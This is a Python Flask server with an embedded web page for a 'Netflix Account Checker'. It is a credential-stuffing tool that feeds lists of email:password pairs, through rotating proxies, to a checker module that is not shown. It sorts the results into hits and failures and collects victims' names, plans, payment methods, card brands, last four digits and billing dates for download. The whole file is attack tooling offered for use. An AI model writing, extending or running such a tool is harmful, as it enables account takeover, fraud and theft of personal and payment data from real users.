# api.py
import os
import threading
import queue
import time
import uuid
from flask import Flask, render_template, request, jsonify, session
from flask_socketio import SocketIO, emit
import checker  # Import your checker.py module

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Store active tasks
active_tasks = {}
results_queue = queue.Queue()

# Progress tracking
class AccountChecker:
    def __init__(self, task_id, accounts, proxy_list=None, use_proxy=False):
        self.task_id = task_id
        self.accounts = accounts
        self.proxy_list = proxy_list if proxy_list else []
        self.use_proxy = use_proxy
        self.total = len(accounts)
        self.processed = 0
        self.hits = []
        self.customs = []
        self.fails = []
        self.ratelimited = []
        self.banned = []
        self.locked = []
        self.errors = []
        self.is_running = True
        self.current_account = None
        self.proxy_index = 0

    def get_next_proxy(self):
        if not self.proxy_list:
            return None
        proxy = self.proxy_list[self.proxy_index % len(self.proxy_list)]
        self.proxy_index += 1
        return proxy

    def process_accounts(self):
        for account in self.accounts:
            if not self.is_running:
                break
            
            try:
                email, password = account.split(':', 1)
                proxy = self.get_next_proxy() if self.use_proxy and self.proxy_list else None
                
                self.current_account = f"{email}:{password[:5]}..."
                
                # Emit progress update
                socketio.emit('progress_update', {
                    'task_id': self.task_id,
                    'processed': self.processed,
                    'total': self.total,
                    'current': self.current_account,
                    'hits': len(self.hits),
                    'customs': len(self.customs),
                    'fails': len(self.fails)
                })
                
                # Check the account
                result = checker.check_account(email, password, proxy)
                
                # Categorize result
                if result['status'] == 'HIT':
                    self.hits.append(result)
                    socketio.emit('new_hit', {
                        'task_id': self.task_id,
                        'result': result
                    })
                elif result['status'] == 'CUSTOM':
                    self.customs.append(result)
                    socketio.emit('new_custom', {
                        'task_id': self.task_id,
                        'result': result
                    })
                elif result['status'] == 'FAIL':
                    self.fails.append(result)
                elif result['status'] == 'RATE_LIMITED':
                    self.ratelimited.append(result)
                elif result['status'] == 'BAN':
                    self.banned.append(result)
                elif result['status'] == 'LOCKED':
                    self.locked.append(result)
                else:
                    self.errors.append(result)
                
                self.processed += 1
                
            except Exception as e:
                self.errors.append({
                    'email': account.split(':')[0],
                    'status': 'ERROR',
                    'message': str(e)
                })
                self.processed += 1
            
            time.sleep(0.5)  # Small delay to avoid rate limiting
        
        self.is_running = False
        socketio.emit('task_complete', {
            'task_id': self.task_id,
            'stats': self.get_stats()
        })
    
    def get_stats(self):
        return {
            'total': self.total,
            'processed': self.processed,
            'hits': len(self.hits),
            'customs': len(self.customs),
            'fails': len(self.fails),
            'ratelimited': len(self.ratelimited),
            'banned': len(self.banned),
            'locked': len(self.locked),
            'errors': len(self.errors)
        }
    
    def stop(self):
        self.is_running = False

@app.route('/')
def index():
    """Render the main page"""
    return render_template('index.html')

@app.route('/api/start_check', methods=['POST'])
def start_check():
    """Start checking accounts"""
    data = request.json
    
    # Get accounts from either text input or file upload
    accounts_text = data.get('accounts', '')
    use_proxy = data.get('use_proxy', False)
    proxies_text = data.get('proxies', '')
    
    # Parse accounts
    accounts = []
    if accounts_text:
        for line in accounts_text.strip().split('\n'):
            line = line.strip()
            if line and ':' in line:
                accounts.append(line)
    
    if not accounts:
        return jsonify({'error': 'No valid accounts provided'}), 400
    
    # Parse proxies
    proxies = []
    if use_proxy and proxies_text:
        for line in proxies_text.strip().split('\n'):
            line = line.strip()
            if line:
                proxies.append(line)
    
    # Create task
    task_id = str(uuid.uuid4())
    checker_task = AccountChecker(task_id, accounts, proxies, use_proxy)
    active_tasks[task_id] = checker_task
    
    # Start checking in background thread
    thread = threading.Thread(target=checker_task.process_accounts)
    thread.daemon = True
    thread.start()
    
    return jsonify({
        'task_id': task_id,
        'total': len(accounts),
        'message': 'Account checking started'
    })

@app.route('/api/stop_check/<task_id>', methods=['POST'])
def stop_check(task_id):
    """Stop a running check"""
    if task_id in active_tasks:
        active_tasks[task_id].stop()
        return jsonify({'message': 'Task stopped'})
    return jsonify({'error': 'Task not found'}), 404

@app.route('/api/task_status/<task_id>', methods=['GET'])
def task_status(task_id):
    """Get task status"""
    if task_id in active_tasks:
        task = active_tasks[task_id]
        return jsonify({
            'task_id': task_id,
            'is_running': task.is_running,
            'stats': task.get_stats()
        })
    return jsonify({'error': 'Task not found'}), 404

@app.route('/api/get_results/<task_id>/<result_type>', methods=['GET'])
def get_results(task_id, result_type):
    """Get results for a specific task and type"""
    if task_id not in active_tasks:
        return jsonify({'error': 'Task not found'}), 404
    
    task = active_tasks[task_id]
    
    if result_type == 'hits':
        results = task.hits
    elif result_type == 'customs':
        results = task.customs
    else:
        return jsonify({'error': 'Invalid result type'}), 400
    
    return jsonify({'results': results})

@app.route('/api/clear_task/<task_id>', methods=['POST'])
def clear_task(task_id):
    """Remove a task from active tasks"""
    if task_id in active_tasks:
        # Stop if running
        if active_tasks[task_id].is_running:
            active_tasks[task_id].stop()
        # Remove from active tasks
        del active_tasks[task_id]
        return jsonify({'message': 'Task cleared'})
    return jsonify({'error': 'Task not found'}), 404

@app.route('/api/download_results/<task_id>/<result_type>', methods=['GET'])
def download_results(task_id, result_type):
    """Download results as text file"""
    if task_id not in active_tasks:
        return jsonify({'error': 'Task not found'}), 404
    
    task = active_tasks[task_id]
    
    if result_type == 'hits':
        results = task.hits
        filename = f"netflix_hits_{task_id[:8]}.txt"
    elif result_type == 'customs':
        results = task.customs
        filename = f"netflix_customs_{task_id[:8]}.txt"
    else:
        return jsonify({'error': 'Invalid result type'}), 400
    
    # Format results
    lines = []
    for result in results:
        line = f"Email: {result.get('email', 'N/A')}\n"
        line += f"Status: {result.get('status', 'N/A')}\n"
        line += f"Membership: {result.get('membership', 'N/A')}\n"
        line += f"Name: {result.get('name', 'N/A')}\n"
        line += f"Plan: {result.get('plan', 'N/A')}\n"
        line += f"Price: {result.get('price', 'N/A')}\n"
        line += f"Country: {result.get('country', 'N/A')}\n"
        line += f"Payment: {result.get('payment_method', 'N/A')} - {result.get('card_brand', 'N/A')} {result.get('card_last_4', 'N/A')}\n"
        line += f"Member Since: {result.get('member_since', 'N/A')}\n"
        line += f"Next Billing: {result.get('next_billing', 'N/A')}\n"
        line += "-" * 50 + "\n"
        lines.append(line)
    
    return jsonify({
        'filename': filename,
        'content': '\n'.join(lines)
    })

if __name__ == '__main__':
    # Create templates folder if it doesn't exist
    if not os.path.exists('templates'):
        os.makedirs('templates')
    
    # Create the HTML template file
    with open('templates/index.html', 'w') as f:
        f.write('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Account Checker</title>
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        h1 {
            text-align: center;
            color: white;
            margin-bottom: 30px;
            font-size: 2.5em;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
            animation: fadeInDown 1s ease;
        }

        .main-panel {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: slideUp 0.5s ease;
        }

        .input-section {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }

        textarea, input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-family: monospace;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        textarea:focus, input[type="text"]:focus {
            border-color: #667eea;
            outline: none;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        textarea {
            height: 200px;
            resize: vertical;
        }

        .file-upload {
            border: 2px dashed #667eea;
            border-radius: 10px;
            padding: 20px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .file-upload:hover {
            background: rgba(102, 126, 234, 0.1);
        }

        .file-upload input[type="file"] {
            display: none;
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 15px 0;
        }

        .checkbox-group input[type="checkbox"] {
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            width: 100%;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }

        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .progress-section {
            background: #f5f5f5;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
        }

        .progress-bar {
            width: 100%;
            height: 30px;
            background: #e0e0e0;
            border-radius: 15px;
            overflow: hidden;
            margin: 10px 0;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            transition: width 0.3s ease;
            width: 0%;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }

        .stat-card {
            background: white;
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            animation: fadeIn 0.5s ease;
        }

        .stat-card.hits {
            border-left: 4px solid #4CAF50;
        }

        .stat-card.customs {
            border-left: 4px solid #FF9800;
        }

        .stat-card.fails {
            border-left: 4px solid #f44336;
        }

        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #333;
        }

        .stat-label {
            font-size: 12px;
            color: #666;
            text-transform: uppercase;
        }

        .results-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-top: 30px;
        }

        .result-box {
            background: white;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            max-height: 500px;
            overflow-y: auto;
        }

        .result-box h3 {
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid #f0f0f0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .hit-item, .custom-item {
            background: #f9f9f9;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
            animation: slideIn 0.3s ease;
            cursor: pointer;
            transition: transform 0.2s ease;
        }

        .hit-item:hover, .custom-item:hover {
            transform: translateX(5px);
        }

        .hit-item {
            border-left: 4px solid #4CAF50;
        }

        .custom-item {
            border-left: 4px solid #FF9800;
        }

        .item-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
        }

        .item-email {
            font-weight: bold;
            color: #333;
        }

        .item-plan {
            color: #666;
            font-size: 12px;
        }

        .item-details {
            font-size: 12px;
            color: #888;
            margin-top: 5px;
        }

        .item-details.hidden {
            display: none;
        }

        .download-btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            font-size: 12px;
            cursor: pointer;
            margin-left: 10px;
        }

        .stop-btn {
            background: #f44336;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 600;
            margin-left: 10px;
        }

        .current-account {
            background: #e3f2fd;
            padding: 10px;
            border-radius: 5px;
            margin: 10px 0;
            font-family: monospace;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-10px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .pulse {
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎬 Netflix Account Checker</h1>
        
        <div class="main-panel">
            <div class="input-section">
                <div>
                    <div class="input-group">
                        <label>📧 Email:Password (one per line)</label>
                        <textarea id="accounts" placeholder="email1:password1&#10;email2:password2&#10;email3:password3"></textarea>
                    </div>
                    
                    <div class="file-upload" onclick="$('#file-input').click()">
                        <input type="file" id="file-input" accept=".txt">
                        <span>📁 Click to upload accounts file or drag & drop</span>
                    </div>
                </div>
                
                <div>
                    <div class="input-group">
                        <label>🌐 Proxies (one per line - optional)</label>
                        <textarea id="proxies" placeholder="proxy1:port&#10;proxy2:port:user:pass&#10;proxy3:port"></textarea>
                    </div>
                    
                    <div class="checkbox-group">
                        <input type="checkbox" id="use-proxy">
                        <label for="use-proxy">Use proxies for checking</label>
                    </div>
                </div>
            </div>
            
            <div style="display: flex; gap: 10px;">
                <button id="start-btn" onclick="startChecking()">🚀 Start Checking</button>
                <button id="stop-btn" class="stop-btn" onclick="stopChecking()" style="display: none;">⏹️ Stop</button>
            </div>
            
            <div id="progress-section" class="progress-section" style="display: none;">
                <h3>Progress</h3>
                <div class="current-account" id="current-account">Waiting to start...</div>
                
                <div class="progress-bar">
                    <div class="progress-fill" id="progress-fill"></div>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-card hits">
                        <div class="stat-value" id="hits-count">0</div>
                        <div class="stat-label">HITS</div>
                    </div>
                    <div class="stat-card customs">
                        <div class="stat-value" id="customs-count">0</div>
                        <div class="stat-label">CUSTOM</div>
                    </div>
                    <div class="stat-card fails">
                        <div class="stat-value" id="fails-count">0</div>
                        <div class="stat-label">FAILED</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="processed-count">0</div>
                        <div class="stat-label">PROCESSED</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value" id="total-count">0</div>
                        <div class="stat-label">TOTAL</div>
                    </div>
                </div>
            </div>
            
            <div class="results-container">
                <div class="result-box">
                    <h3>
                        ✅ HITS (<span id="hits-total">0</span>)
                        <button class="download-btn" onclick="downloadResults('hits')" id="download-hits" style="display: none;">Download</button>
                    </h3>
                    <div id="hits-list"></div>
                </div>
                
                <div class="result-box">
                    <h3>
                        ⚠️ CUSTOM (<span id="customs-total">0</span>)
                        <button class="download-btn" onclick="downloadResults('customs')" id="download-customs" style="display: none;">Download</button>
                    </h3>
                    <div id="customs-list"></div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        let socket = null;
        let currentTaskId = null;
        let isChecking = false;
        
        // Initialize socket connection
        socket = io.connect('http://' + document.domain + ':' + location.port);
        
        socket.on('connect', function() {
            console.log('Connected to server');
        });
        
        socket.on('progress_update', function(data) {
            if (data.task_id === currentTaskId) {
                $('#progress-section').show();
                
                // Update progress bar
                let percentage = (data.processed / data.total) * 100;
                $('#progress-fill').css('width', percentage + '%');
                
                // Update counts
                $('#processed-count').text(data.processed);
                $('#total-count').text(data.total);
                $('#hits-count').text(data.hits);
                $('#customs-count').text(data.customs);
                $('#fails-count').text(data.fails);
                $('#hits-total').text(data.hits);
                $('#customs-total').text(data.customs);
                
                // Update current account
                $('#current-account').text('Checking: ' + data.current);
            }
        });
        
        socket.on('new_hit', function(data) {
            if (data.task_id === currentTaskId) {
                addHitToUI(data.result);
                $('#download-hits').show();
            }
        });
        
        socket.on('new_custom', function(data) {
            if (data.task_id === currentTaskId) {
                addCustomToUI(data.result);
                $('#download-customs').show();
            }
        });
        
        socket.on('task_complete', function(data) {
            if (data.task_id === currentTaskId) {
                isChecking = false;
                $('#start-btn').prop('disabled', false).text('🚀 Start Checking');
                $('#stop-btn').hide();
                $('#current-account').text('✅ Check completed!');
                
                // Update final stats
                updateStats(data.stats);
                
                // Show notification
                alert('Checking completed! Found ' + data.stats.hits + ' hits and ' + data.stats.customs + ' custom accounts.');
            }
        });
        
        function addHitToUI(result) {
            let html = `
                <div class="hit-item" onclick="toggleDetails(this)">
                    <div class="item-header">
                        <span class="item-email">${result.email || 'N/A'}</span>
                        <span class="item-plan">${result.plan || 'N/A'}</span>
                    </div>
                    <div class="item-details hidden">
                        <div>Name: ${result.name || 'N/A'}</div>
                        <div>Country: ${result.country || 'N/A'}</div>
                        <div>Price: ${result.price || 'N/A'}</div>
                        <div>Payment: ${result.payment_method || 'N/A'} ${result.card_brand || ''} ${result.card_last_4 || ''}</div>
                        <div>Member Since: ${result.member_since || 'N/A'}</div>
                        <div>Next Billing: ${result.next_billing || 'N/A'}</div>
                        <div>Status: ${result.membership || 'N/A'}</div>
                    </div>
                </div>
            `;
            $('#hits-list').prepend(html);
        }
        
        function addCustomToUI(result) {
            let html = `
                <div class="custom-item" onclick="toggleDetails(this)">
                    <div class="item-header">
                        <span class="item-email">${result.email || 'N/A'}</span>
                        <span class="item-plan">${result.plan || 'N/A'}</span>
                    </div>
                    <div class="item-details hidden">
                        <div>Name: ${result.name || 'N/A'}</div>
                        <div>Country: ${result.country || 'N/A'}</div>
                        <div>Price: ${result.price || 'N/A'}</div>
                        <div>Message: ${result.message || 'N/A'}</div>
                        <div>Status: ${result.membership || 'N/A'}</div>
                    </div>
                </div>
            `;
            $('#customs-list').prepend(html);
        }
        
        function toggleDetails(element) {
            $(element).find('.item-details').toggleClass('hidden');
        }
        
        function updateStats(stats) {
            $('#hits-count').text(stats.hits);
            $('#customs-count').text(stats.customs);
            $('#fails-count').text(stats.fails);
            $('#hits-total').text(stats.hits);
            $('#customs-total').text(stats.customs);
        }
        
        function startChecking() {
            let accounts = $('#accounts').val();
            let proxies = $('#proxies').val();
            let useProxy = $('#use-proxy').is(':checked');
            
            if (!accounts.trim()) {
                alert('Please enter accounts to check');
                return;
            }
            
            // Disable start button and show stop button
            $('#start-btn').prop('disabled', true).text('Checking...');
            $('#stop-btn').show();
            
            // Clear previous results
            $('#hits-list').empty();
            $('#customs-list').empty();
            $('#hits-total').text('0');
            $('#customs-total').text('0');
            $('#download-hits').hide();
            $('#download-customs').hide();
            
            // Send request to start checking
            $.ajax({
                url: '/api/start_check',
                method: 'POST',
                contentType: 'application/json',
                data: JSON.stringify({
                    accounts: accounts,
                    proxies: proxies,
                    use_proxy: useProxy
                }),
                success: function(response) {
                    currentTaskId = response.task_id;
                    isChecking = true;
                    
                    $('#total-count').text(response.total);
                    $('#processed-count').text('0');
                    $('#progress-fill').css('width', '0%');
                },
                error: function(xhr) {
                    alert('Error: ' + xhr.responseJSON.error);
                    $('#start-btn').prop('disabled', false).text('🚀 Start Checking');
                    $('#stop-btn').hide();
                }
            });
        }
        
        function stopChecking() {
            if (currentTaskId && isChecking) {
                $.ajax({
                    url: '/api/stop_check/' + currentTaskId,
                    method: 'POST',
                    success: function() {
                        isChecking = false;
                        $('#start-btn').prop('disabled', false).text('🚀 Start Checking');
                        $('#stop-btn').hide();
                        $('#current-account').text('⏹️ Stopped by user');
                    }
                });
            }
        }
        
        function downloadResults(type) {
            if (!currentTaskId) return;
            
            $.ajax({
                url: '/api/download_results/' + currentTaskId + '/' + type,
                method: 'GET',
                success: function(response) {
                    // Create download link
                    let blob = new Blob([response.content], { type: 'text/plain' });
                    let url = window.URL.createObjectURL(blob);
                    let a = document.createElement('a');
                    a.href = url;
                    a.download = response.filename;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    window.URL.revokeObjectURL(url);
                }
            });
        }
        
        // File upload handling
        $('#file-input').change(function(e) {
            let file = e.target.files[0];
            let reader = new FileReader();
            
            reader.onload = function(e) {
                $('#accounts').val(e.target.result);
            };
            
            reader.readAsText(file);
        });
        
        // Drag and drop
        $('.file-upload').on('dragover', function(e) {
            e.preventDefault();
            e.stopPropagation();
            $(this).css('background', 'rgba(102, 126, 234, 0.2)');
        });
        
        $('.file-upload').on('dragleave', function(e) {
            e.preventDefault();
            e.stopPropagation();
            $(this).css('background', 'none');
        });
        
        $('.file-upload').on('drop', function(e) {
            e.preventDefault();
            e.stopPropagation();
            $(this).css('background', 'none');
            
            let file = e.originalEvent.dataTransfer.files[0];
            if (file) {
                let reader = new FileReader();
                reader.onload = function(e) {
                    $('#accounts').val(e.target.result);
                };
                reader.readAsText(file);
            }
        });
        
        // Clear task when done
        window.addEventListener('beforeunload', function() {
            if (currentTaskId) {
                $.ajax({
                    url: '/api/clear_task/' + currentTaskId,
                    method: 'POST',
                    async: false
                });
            }
        });
    </script>
</body>
</html>
        ''')
    
    print("=" * 60)
    print("🎬 Netflix Account Checker API")
    print("=" * 60)
    print("📡 Server starting...")
    print(f"🌐 Web interface: http://localhost:5000")
    print("=" * 60)
    print("📝 Features:")
    print("  • Real-time progress tracking")
    print("  • Separate HIT and CUSTOM result boxes")
    print("  • Auto-remove checked accounts")
    print("  • File upload support")
    print("  • Proxy support")
    print("  • Download results as text files")
    print("=" * 60)
    
    socketio.run(app, debug=True, host='0.0.0.0', port=5000)
